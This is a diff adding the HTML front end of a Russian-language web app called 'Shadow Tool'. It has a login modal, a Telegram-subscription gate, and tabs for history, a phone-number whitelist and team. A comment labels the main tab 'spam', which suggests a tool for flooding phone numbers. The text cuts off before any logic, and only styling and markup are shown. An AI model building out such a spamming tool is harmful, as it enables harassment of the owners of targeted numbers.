@@ -1,0 +1,1584 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
+    <title>Shadow Tool</title>
+    
+    <!-- PWA manifest -->
+    <link rel="manifest" href="manifest.json">
+    
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@300;400;500&family=Roboto:wght@300;400;500;700&display=swap');
+
+        :root {
+            --primary-color: #000000;
+            --secondary-color: #ffffff;
+            --accent-color: #808080;
+            --bg-color: #000000;
+            --card-bg: rgba(0, 0, 0, 0.8);
+            --dead-red: #ff5555;
+            --dead-dark: #1a0000;
+            --border-color: #ffffff;
+            --success-color: #4CAF50;
+            --error-color: #ff5555;
+            --warning-color: #ffaa00;
+        }
+
+        * {
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
+        }
+
+        body {
+            margin: 0;
+            padding: 15px;
+            background: #000000;
+            color: var(--secondary-color);
+            font-family: 'Roboto', 'Segoe UI', sans-serif;
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        .star-field {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            pointer-events: none;
+        }
+        .star {
+            position: absolute;
+            background-color: white;
+            border-radius: 50%;
+        }
+        .star.big { animation: twinkle 3s infinite alternate; }
+        .star.medium { animation: twinkle 4s infinite alternate-reverse; }
+        .star.small { animation: twinkle 5s infinite alternate; }
+        @keyframes twinkle { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        @keyframes colorPulse {
+            0%, 100% { color: #ffffff; text-shadow: 0 0 10px rgba(255, 255, 255, 0.3); }
+            25% { color: #f0f0f0; text-shadow: 0 0 15px rgba(255, 255, 255, 0.5); }
+            50% { color: #e0e0e0; text-shadow: 0 0 20px rgba(255, 255, 255, 0.7); }
+            75% { color: #f0f0f0; text-shadow: 0 0 15px rgba(255, 255, 255, 0.5); }
+        }
+
+        @keyframes blackWhiteFlow {
+            0%, 100% { color: #ffffff; border-color: #ffffff; }
+            25% { color: #cccccc; border-color: #cccccc; }
+            50% { color: #999999; border-color: #999999; }
+            75% { color: #cccccc; border-color: #cccccc; }
+        }
+
+        @keyframes subtleFlow {
+            0%, 100% { color: #ffffff; opacity: 1; }
+            33% { color: #f5f5f5; opacity: 0.9; }
+            66% { color: #ebebeb; opacity: 0.95; }
+        }
+
+        .subscription-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            backdrop-filter: blur(5px);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            padding: 20px;
+        }
+        .subscription-modal.show { display: flex; opacity: 1; }
+        .modal-content {
+            background: #000000;
+            border: 2px solid var(--border-color);
+            border-radius: 0;
+            padding: 30px 20px;
+            max-width: 500px;
+            width: 100%;
+            position: relative;
+            animation: modalAppear 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            transform: scale(0.9);
+            transition: transform 0.3s ease;
+        }
+        .subscription-modal.show .modal-content { transform: scale(1); }
+        @keyframes modalAppear {
+            from { opacity: 0; transform: translateY(-20px) scale(0.9); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+        .close-modal {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: #000000;
+            border: 1px solid var(--border-color);
+            color: var(--border-color);
+            width: 40px;
+            height: 40px;
+            border-radius: 0;
+            cursor: pointer;
+            font-size: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
+            z-index: 10000;
+            animation: blackWhiteFlow 5s ease-in-out infinite;
+        }
+        .close-modal:hover, .close-modal:active { background: var(--border-color); color: #000000; animation: none; }
+        .modal-title {
+            font-family: 'Roboto', sans-serif;
+            font-weight: 700;
+            font-size: 1.8em;
+            color: var(--border-color);
+            text-align: center;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            animation: colorPulse 5s ease-in-out infinite;
+        }
+        .modal-text {
+            font-family: 'Roboto', sans-serif;
+            font-weight: 300;
+            font-size: 1.1em;
+            color: #ffffff;
+            text-align: center;
+            line-height: 1.6;
+            margin-bottom: 25px;
+            animation: subtleFlow 5s ease-in-out infinite;
+        }
+        .telegram-link {
+            display: block;
+            background: #000000;
+            border: 2px solid var(--border-color);
+            color: var(--border-color);
+            padding: 15px 25px;
+            text-decoration: none;
+            font-family: 'Roboto', sans-serif;
+            font-weight: 500;
+            font-size: 1.2em;
+            text-align: center;
+            border-radius: 0;
+            margin: 20px auto;
+            max-width: 300px;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            animation: blackWhiteFlow 9s ease-in-out infinite;
+            min-height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .telegram-link:hover, .telegram-link:active { background: var(--border-color); color: #000000; transform: translateY(-2px); animation: none; }
+        .open-modal-btn {
+            position: fixed;
+            top: 15px;
+            right: 15px;
+            background: #000000;
+            border: 1px solid var(--border-color);
+            color: var(--border-color);
+            padding: 12px 20px;
+            cursor: pointer;
+            font-family: 'Roboto', sans-serif;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s;
+            z-index: 100;
+            border-radius: 0;
+            animation: blackWhiteFlow 7s ease-in-out infinite;
+            font-size: 14px;
+            min-height: 45px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+        }
+        .open-modal-btn:hover, .open-modal-btn:active { background: var(--border-color); color: #000000; transform: translateY(-2px); animation: none; }
+
+        /* Модалка логина */
+        .auth-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.98);
+            backdrop-filter: blur(20px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10001;
+        }
+        .auth-box {
+            background: rgba(0,0,0,0.8);
+            border: 2px solid var(--border-color);
+            border-radius: 48px;
+            padding: 40px 30px;
+            width: 90%;
+            max-width: 380px;
+            text-align: center;
+        }
+        .auth-box h2 { margin-bottom: 20px; color: #0f0; }
+        .auth-box input {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            background: #000;
+            border: 1px solid var(--border-color);
+            color: #fff;
+            border-radius: 40px;
+            font-size: 16px;
+            text-align: center;
+        }
+        .auth-box button {
+            width: 100%;
+            padding: 14px;
+            margin-top: 15px;
+            background: #000;
+            border: 1px solid var(--border-color);
+            color: #fff;
+            border-radius: 40px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .auth-box button:hover { background: #fff; color: #000; }
+        .error-msg { color: #ff5555; margin-top: 10px; font-size: 12px; }
+
+        .main-content { display: none; }
+        .main-content.show { display: block; }
+
+        .tabs {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 25px;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+        .tab-btn {
+            background: #000000;
+            border: 1px solid var(--border-color);
+            color: var(--border-color);
+            padding: 12px 20px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-family: 'Roboto', sans-serif;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            min-width: 100px;
+            border-radius: 0;
+            animation: blackWhiteFlow 8s ease-in-out infinite;
+            font-size: 14px;
+            min-height: 45px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex: 1;
+            max-width: 200px;
+        }
+        .tab-btn:hover, .tab-btn:active { background: rgba(255, 255, 255, 0.1); animation: none; }
+        .tab-btn.active { background: var(--border-color); color: #000000; border-color: var(--border-color); animation: none; }
+        .tab-content { display: none; animation: fadeIn 0.5s; }
+        .tab-content.active { display: block; }
+
+        .admins-content {
+            max-width: 700px;
+            margin: 0 auto;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.85);
+            border: 1px solid var(--border-color);
+            backdrop-filter: blur(10px);
+        }
+        .admins-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .admins-title {
+            color: var(--border-color);
+            font-size: 1.8em;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            animation: colorPulse 3s ease-in-out infinite;
+        }
+        .admins-subtitle {
+            color: #aaaaaa;
+            font-size: 0.9em;
+            letter-spacing: 1px;
+        }
+        
+        .team-section {
+            margin-bottom: 30px;
+        }
+        .section-header {
+            margin-bottom: 15px;
+            padding-bottom: 6px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.15);
+        }
+        .section-title {
+            font-family: 'Roboto Mono', monospace;
+            font-size: 0.8em;
+            font-weight: 500;
+            letter-spacing: 2px;
+            color: #aaaaaa;
+        }
+        
+        .admins-list {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .admin-item {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 10px 16px;
+            background: rgba(255, 255, 255, 0.03);
+            border-left: 2px solid var(--border-color);
+            transition: all 0.2s ease;
+            cursor: pointer;
+        }
+        .admin-item:hover {
+            background: rgba(255, 255, 255, 0.08);
+            transform: translateX(3px);
+        }
+        .admin-item-avatar {
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 1px solid var(--border-color);
+        }
+        .admin-item-info {
+            flex: 1;
+        }
+        .admin-item-name {
+            font-family: 'Roboto Mono', monospace;
+            font-size: 1em;
+            font-weight: 500;
+            color: var(--border-color);
+            letter-spacing: 0.5px;
+        }
+        .admin-item-role {
+            font-size: 0.65em;
+            color: #888888;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 2px;
+        }
+        .admin-item-status {
+            font-size: 0.65em;
+            padding: 3px 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 3px;
+            white-space: nowrap;
+        }
+        .status-active { color: #4CAF50; }
+        .status-inactive { color: #888888; }
+
+        .admin-divider {
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--border-color), transparent);
+            margin: 20px 0;
+        }
+
+        .admin-info-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            backdrop-filter: blur(8px);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            padding: 20px;
+        }
+        .admin-info-modal.show { display: flex; opacity: 1; }
+        .admin-info-content {
+            background: #000000;
+            border: 2px solid var(--border-color);
+            border-radius: 0;
+            padding: 30px;
+            max-width: 450px;
+            width: 100%;
+            position: relative;
+            animation: modalAppear 0.4s ease;
+            text-align: center;
+        }
+        .admin-info-avatar {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid var(--border-color);
+            margin-bottom: 20px;
+        }
+        .admin-info-name {
+            font-size: 1.8em;
+            font-weight: bold;
+            color: var(--border-color);
+            margin-bottom: 8px;
+            animation: colorPulse 3s ease-in-out infinite;
+        }
+        .admin-info-role {
+            font-size: 0.9em;
+            color: #aaaaaa;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 20px;
+        }
+        .admin-info-desc {
+            font-size: 1em;
+            line-height: 1.6;
+            color: #ffffff;
+            text-align: left;
+            margin: 20px 0;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border-left: 3px solid var(--border-color);
+        }
+        .admin-info-username {
+            font-family: 'Roboto Mono', monospace;
+            font-size: 0.9em;
+            color: var(--accent-color);
+            margin-top: 10px;
+        }
+        .close-info-modal {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: none;
+            border: none;
+            color: var(--border-color);
+            font-size: 24px;
+            cursor: pointer;
+            width: 35px;
+            height: 35px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .close-info-modal:hover { color: #ff5555; }
+
+        .tutorial-content {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.85);
+            border: 1px solid var(--border-color);
+            backdrop-filter: blur(10px);
+        }
+        .tutorial-step { margin-bottom: 20px; padding: 15px; border-left: 3px solid var(--border-color); background: rgba(255, 255, 255, 0.05); }
+        .tutorial-step h3 { color: var(--border-color); margin-top: 0; animation: subtleFlow 4s ease-in-out infinite; font-size: 1.2em; }
+        .tutorial-step p { animation: subtleFlow 6s ease-in-out infinite; font-size: 1em; line-height: 1.5; }
+        .youtube-link {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: #000000;
+            border: 2px solid var(--border-color);
+            color: var(--border-color);
+            padding: 15px 25px;
+            text-decoration: none;
+            font-family: 'Roboto', sans-serif;
+            font-weight: 500;
+            font-size: 1.1em;
+            text-align: center;
+            border-radius: 0;
+            margin: 15px 0;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            animation: blackWhiteFlow 9s ease-in-out infinite;
+            min-height: 50px;
+        }
+        .youtube-link:hover, .youtube-link:active { background: var(--border-color); color: #000000; transform: translateY(-2px); animation: none; }
+        
+        .history-content {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.85);
+            border: 1px solid var(--border-color);
+            backdrop-filter: blur(10px);
+        }
+        .history-stats { display: flex; justify-content: center; margin-bottom: 25px; flex-wrap: wrap; gap: 15px; }
+        .stat-card { flex: 1; min-width: 150px; padding: 15px; border: 1px solid var(--border-color); text-align: center; background: rgba(255, 255, 255, 0.05); animation: subtleFlow 6s ease-in-out infinite; }
+        .stat-value { font-size: 2em; font-weight: bold; margin-bottom: 8px; animation: colorPulse 3s ease-in-out infinite; }
+        .stat-label { font-size: 0.8em; text-transform: uppercase; letter-spacing: 1px; }
+        .history-controls { display: flex; justify-content: space-between; margin-bottom: 20px; flex-wrap: wrap; gap: 10px; }
+        .history-controls button {
+            padding: 10px 15px;
+            border: 1px solid var(--border-color);
+            background: #000000;
+            color: var(--border-color);
+            cursor: pointer;
+            transition: all 0.3s;
+            animation: blackWhiteFlow 8s ease-in-out infinite;
+            font-size: 14px;
+            min-height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex: 1;
+            min-width: 120px;
+        }
+        .history-controls button:hover, .history-controls button:active { background: rgba(255, 255, 255, 0.1); animation: none; }
+        .history-table-container { overflow-x: auto; }
+        .history-table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 14px; }
+        .history-table th { background: rgba(255, 255, 255, 0.1); padding: 12px 10px; text-align: left; border-bottom: 2px solid var(--border-color); text-transform: uppercase; letter-spacing: 1px; animation: subtleFlow 5s ease-in-out infinite; white-space: nowrap; }
+        .history-table td { padding: 10px; border-bottom: 1px solid rgba(255, 255, 255, 0.1); animation: subtleFlow 7s ease-in-out infinite; white-space: nowrap; }
+        .history-table tr:hover { background: rgba(255, 255, 255, 0.05); }
+        .phone-number { font-family: 'Roboto Mono', monospace; font-weight: bold; font-size: 0.9em; }
+        .status-badge { display: inline-flex; align-items: center; justify-content: center; padding: 4px 10px; border-radius: 12px; font-size: 0.75em; font-weight: bold; text-transform: uppercase; min-width: 70px; text-align: center; }
+        .status-success { background: rgba(255, 255, 255, 0.1); color: var(--border-color); border: 1px solid var(--border-color); }
+        .action-buttons { display: flex; gap: 5px; }
+        .action-btn {
+            padding: 6px 10px;
+            border: 1px solid var(--border-color);
+            background: transparent;
+            color: var(--border-color);
+            cursor: pointer;
+            font-size: 0.8em;
+            transition: all 0.3s;
+            min-width: 35px;
+            min-height: 35px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .action-btn:hover, .action-btn:active { background: rgba(255, 255, 255, 0.1); }
+        .no-history { text-align: center; padding: 30px; color: var(--accent-color); font-style: italic; }
+        
+        .whitelist-content {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.85);
+            border: 1px solid var(--border-color);
+            backdrop-filter: blur(10px);
+        }
+        .whitelist-header { text-align: center; margin-bottom: 30px; }
+        .whitelist-title {
+            color: var(--border-color);
+            font-size: 2em;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            animation: colorPulse 3s ease-in-out infinite;
+        }
+        .whitelist-subtitle { color: #ffffff; font-size: 1.1em; margin-bottom: 20px; animation: subtleFlow 5s ease-in-out infinite; }
+        .admin-status {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 8px 16px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid var(--border-color);
+            color: var(--border-color);
+            border-radius: 20px;
+            font-size: 0.9em;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 20px;
+            animation: blackWhiteFlow 4s ease-in-out infinite;
+        }
+        .admin-panel {
+            background: rgba(0, 0, 0, 0.7);
+            border: 2px solid var(--border-color);
+            padding: 25px;
+            margin-bottom: 30px;
+            animation: blackWhiteFlow 5s ease-in-out infinite;
+        }
+        .admin-panel h3 { color: var(--border-color); margin-top: 0; margin-bottom: 20px; text-align: center; text-transform: uppercase; letter-spacing: 1px; animation: subtleFlow 4s ease-in-out infinite; }
+        .admin-form { display: flex; flex-wrap: wrap; gap: 15px; align-items: flex-end; justify-content: center; }
+        .form-group { flex: 1; min-width: 200px; }
+        .form-group label { display: block; color: var(--border-color); margin-bottom: 8px; font-size: 0.9em; text-transform: uppercase; letter-spacing: 1px; animation: subtleFlow 6s ease-in-out infinite; }
+        .admin-form input {
+            background: #000000;
+            border: 1px solid var(--border-color);
+            color: #ffffff;
+            padding: 12px 15px;
+            width: 100%;
+            font-size: 1em;
+            transition: all 0.3s;
+            border-radius: 0;
+            min-height: 45px;
+            animation: blackWhiteFlow 10s ease-in-out infinite;
+        }
+        .admin-form input:focus { outline: none; border-color: #ffffff; background: rgba(255, 255, 255, 0.05); animation: none; }
+        .admin-form button {
+            background: #000000;
+            border: 2px solid var(--border-color);
+            color: var(--border-color);
+            padding: 12px 25px;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: bold;
+            transition: all 0.3s;
+            min-height: 45px;
+            animation: blackWhiteFlow 3s ease-in-out infinite;
+            flex: 0 0 auto;
+        }
+        .admin-form button:hover, .admin-form button:active { background: var(--border-color); color: #000000; animation: none; }
+        .whitelist-table-container { overflow-x: auto; margin-top: 25px; }
+        .whitelist-table { width: 100%; border-collapse: collapse; font-size: 14px; }
+        .whitelist-table th {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px 12px;
+            text-align: left;
+            border-bottom: 2px solid var(--border-color);
+            color: var(--border-color);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            animation: subtleFlow 5s ease-in-out infinite;
+            white-space: nowrap;
+        }
+        .whitelist-table td { padding: 12px 10px; border-bottom: 1px solid rgba(255, 255, 255, 0.1); color: #ffffff; white-space: nowrap; animation: subtleFlow 7s ease-in-out infinite; }
+        .whitelist-table tr:hover { background: rgba(255, 255, 255, 0.05); }
+        .whitelist-phone { font-family: 'Roboto Mono', monospace; font-weight: bold; font-size: 1.1em; color: var(--border-color); animation: blackWhiteFlow 8s ease-in-out infinite; }
+        .whitelist-actions { display: flex; gap: 8px; justify-content: flex-end; }
+        .whitelist-btn {
+            padding: 6px 12px;
+            border: 1px solid var(--border-color);
+            background: transparent;
+            color: var(--border-color);
+            cursor: pointer;
+            font-size: 0.8em;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s;
+            min-width: 35px;
+            min-height: 35px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: blackWhiteFlow 9s ease-in-out infinite;
+        }
+        .whitelist-btn:hover, .whitelist-btn:active { background: var(--border-color); color: #000000; animation: none; }
+        .no-whitelist { text-align: center; padding: 40px 20px; color: var(--border-color); font-style: italic; border: 1px dashed rgba(255, 255, 255, 0.3); background: rgba(255, 255, 255, 0.05); animation: subtleFlow 6s ease-in-out infinite; }
+        .protection-badge {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 6px 15px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid var(--border-color);
+            color: var(--border-color);
+            border-radius: 15px;
+            font-size: 0.8em;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            animation: blackWhiteFlow 7s ease-in-out infinite;
+        }
+        
+        .glitch-container { text-align: center; margin: 2em 0; position: relative; z-index: 1; }
+        .glitch {
+            font-size: 2.5em;
+            position: relative;
+            color: #ffffff;
+            animation: textFloat 6s ease-in-out infinite, colorPulse 4s ease-in-out infinite;
+            letter-spacing: 1px;
+            font-family: 'Roboto', sans-serif;
+            font-weight: 700;
+            text-transform: uppercase;
+            line-height: 1.2;
+        }
+        @keyframes textFloat { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
+        .glitch-container .author {
+            color: #ffffff;
+            font-size: 1.1em;
+            margin-top: 10px;
+            letter-spacing: 1px;
+            font-family: 'Roboto', sans-serif;
+            font-weight: 300;
+            position: relative;
+            display: inline-block;
+            padding: 0 15px;
+            animation: subtleFlow 5s ease-in-out infinite;
+        }
+        .author::before, .author::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            width: 20px;
+            height: 1px;
+            background: var(--border-color);
+            animation: blackWhiteFlow 8s ease-in-out infinite;
+        }
+        .author::before { left: -25px; }
+        .author::after { right: -25px; }
+        
+        .terminal {
+            max-width: 800px;
+            margin: 0 auto;
+            border: 1px solid var(--border-color);
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.85);
+            position: relative;
+            animation: terminalFloat 8s ease-in-out infinite;
+            backdrop-filter: blur(10px);
+        }
+        @keyframes terminalFloat { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-3px); } }
+        .terminal::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: var(--border-color);
+            animation: scanLine 3s linear infinite, blackWhiteFlow 8s ease-in-out infinite;
+        }
+        @keyframes scanLine { 0% { background-position: -200% 0; } 100% { background-position: 200% 0; } }
+        
+        input[type="text"] {
+            background: #000000;
+            border: 1px solid var(--border-color);
+            color: var(--border-color);
+            padding: 15px 20px;
+            width: 100%;
+            max-width: 400px;
+            margin: 15px auto;
+            font-size: 1.1em;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            font-family: 'Roboto', sans-serif;
+            font-weight: 300;
+            animation: blackWhiteFlow 10s ease-in-out infinite;
+            display: block;
+            border-radius: 0;
+            min-height: 50px;
+        }
+        input[type="text"]:focus { outline: none; border-color: #ffffff; background: rgba(255, 255, 255, 0.05); animation: none; }
+        .input-container { display: flex; justify-content: center; width: 100%; }
+        
+        button, .button {
+            background: #000000;
+            border: 1px solid var(--border-color);
+            color: var(--border-color);
+            padding: 15px 25px;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            text-transform: uppercase;
+            margin: 10px 5px;
+            text-decoration: none;
+            font-weight: 500;
+            border-radius: 0;
+            animation: blackWhiteFlow 9s ease-in-out infinite;
+            font-size: 14px;
+            min-height: 50px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            flex: 1;
+            max-width: 200px;
+        }
+        button:hover, .button:hover, button:active, .button:active { border-color: #ffffff; background: rgba(255, 255, 255, 0.1); transform: translateY(-2px); animation: none; }
+        .button-container { display: flex; justify-content: center; flex-wrap: wrap; gap: 10px; margin: 20px 0; }
+        
+        .logs {
+            height: 250px;
+            overflow-y: auto;
+            margin-top: 25px;
+            border-top: 1px solid var(--border-color);
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.5);
+        }
+        .log-item {
+            padding: 10px 12px;
+            margin: 8px 0;
+            border-left: 2px solid var(--border-color);
+            background: rgba(255, 255, 255, 0.05);
+            animation: logEntry 0.6s cubic-bezier(0.4, 0, 0.2, 1), subtleFlow 7s ease-in-out infinite;
+            transition: all 0.3s;
+            font-size: 0.9em;
+            font-family: 'Roboto Mono', monospace;
+            line-height: 1.4;
+        }
+        .log-item:hover { transform: translateX(5px); border-left-color: #ffffff; background: rgba(255, 255, 255, 0.1); }
+        
+        .status {
+            position: fixed;
+            bottom: 15px;
+            right: 15px;
+            color: var(--border-color);
+            font-weight: 300;
+            padding: 10px 15px;
+            background: rgba(0, 0, 0, 0.85);
+            border: 1px solid var(--border-color);
+            border-radius: 0;
+            animation: statusPulse 3s ease-in-out infinite, blackWhiteFlow 6s ease-in-out infinite;
+            letter-spacing: 1px;
+            font-family: 'Roboto', sans-serif;
+            font-weight: 400;
+            cursor: pointer;
+            z-index: 1;
+            font-size: 14px;
+            min-height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            max-width: 250px;
+            text-align: center;
+            backdrop-filter: blur(5px);
+        }
+        .status:hover, .status:active { background: rgba(255, 255, 255, 0.1); }
+        @keyframes statusPulse { 0%, 100% { opacity: 1; border-color: var(--border-color); } 50% { opacity: 0.7; border-color: #cccccc; } }
+        
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: rgba(255, 255, 255, 0.05); }
+        ::-webkit-scrollbar-thumb { background: var(--border-color); }
+        
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes logEntry { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
+        
+        @media (max-width: 768px) {
+            body { padding: 10px; }
+            .glitch { font-size: 2em; }
+            .tab-btn { min-width: 80px; padding: 10px 15px; font-size: 12px; min-height: 40px; }
+            .modal-title { font-size: 1.5em; }
+            .stat-card { min-width: 120px; padding: 12px; }
+            .stat-value { font-size: 1.5em; }
+            .history-table { font-size: 12px; }
+            .status { font-size: 12px; padding: 8px 12px; max-width: 200px; min-height: 35px; }
+            input[type="text"] { font-size: 1em; padding: 12px 15px; min-height: 45px; }
+            button, .button { min-height: 45px; font-size: 12px; padding: 12px 15px; }
+            .admin-item { padding: 10px 15px; gap: 12px; }
+            .admin-item-avatar { width: 38px; height: 38px; }
+            .admin-item-name { font-size: 0.95em; }
+            .admin-info-avatar { width: 70px; height: 70px; }
+            .admin-info-name { font-size: 1.4em; }
+            .section-title { font-size: 0.7em; }
+        }
+        @media (max-width: 480px) {
+            .tabs { flex-direction: column; align-items: center; }
+            .tab-btn { width: 100%; max-width: 250px; }
+            .button-container { flex-direction: column; align-items: center; }
+            button, .button { width: 100%; max-width: 250px; margin: 5px 0; }
+            .history-controls { flex-direction: column; align-items: center; }
+            .history-controls button { width: 100%; max-width: 250px; }
+        }
+    </style>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js"></script>
+</head>
+<body>
+    <div class="overlay"></div>
+    <div class="star-field" id="starField"></div>
+
+    <!-- Модалка логина -->
+    <div class="auth-overlay" id="authOverlay">
+        <div class="auth-box" id="authBox">
+            <h2 id="authTitle">🔐 ВХОД</h2>
+            <input type="text" id="authUsername" placeholder="Юзернейм">
+            <input type="password" id="authPassword" placeholder="Пароль">
+            <button id="authActionBtn" onclick="handleAuth()">ВОЙТИ</button>
+            <div class="auth-switch" onclick="toggleAuthMode()">
+                <span id="authSwitchText">Зарегистрироваться</span>
+            </div>
+            <div id="authError" class="error-msg"></div>
+        </div>
+    </div>
+
+    <div class="main-content" id="mainContent">
+        <a href="https://telegram.org/support" class="open-modal-btn" target="_blank">Поддержка Telegram</a>
+        <div class="subscription-modal" id="subscriptionModal">
+            <div class="modal-content">
+                <button class="close-modal" onclick="closeModal()">✕</button>
+                <h2 class="modal-title">ПОДПИШИСЬ</h2>
+                <p class="modal-text">Для использования нашего инструмента<br>необходимо подписаться на наш Telegram-канал</p>
+                <a href="https://t.me/fallsfack" class="telegram-link" target="_blank">ПОДПИСАТЬСЯ</a>
+                <p class="modal-text" style="font-size: 0.9em; color: var(--border-color);">После подписки окно закроется автоматически</p>
+            </div>
+        </div>
+
+        <div class="admin-info-modal" id="adminInfoModal">
+            <div class="admin-info-content">
+                <button class="close-info-modal" onclick="closeAdminInfoModal()">✕</button>
+                <img class="admin-info-avatar" id="infoAvatar" src="" alt="Avatar">
+                <div class="admin-info-name" id="infoName"></div>
+                <div class="admin-info-role" id="infoRole"></div>
+                <div class="admin-info-desc" id="infoDesc"></div>
+                <div class="admin-info-username" id="infoUsername"></div>
+            </div>
+        </div>
+
+        <div class="glitch-container">
+            <div class="glitch">SHADOW TOOL</div>
+            <div class="author">author: Amnesia</div>
+        </div>
+
+        <div class="tabs">
+            <button class="tab-btn active" onclick="switchTab('main')">Главная</button>
+            <button class="tab-btn" onclick="switchTab('tutorial')">Туториал</button>
+            <button class="tab-btn" onclick="switchTab('history')">История</button>
+            <button class="tab-btn admin-only" id="whitelistTabBtn" onclick="switchTab('whitelist')" style="display:none">Белый Лист</button>
+            <button class="tab-btn" onclick="switchTab('admins')">Команда</button>
+        </div>
+
+        <!-- СПАМ -->
+        <div id="mainTab" class="tab-content active">
+            <div class="terminal">
+                <div class="input-container">
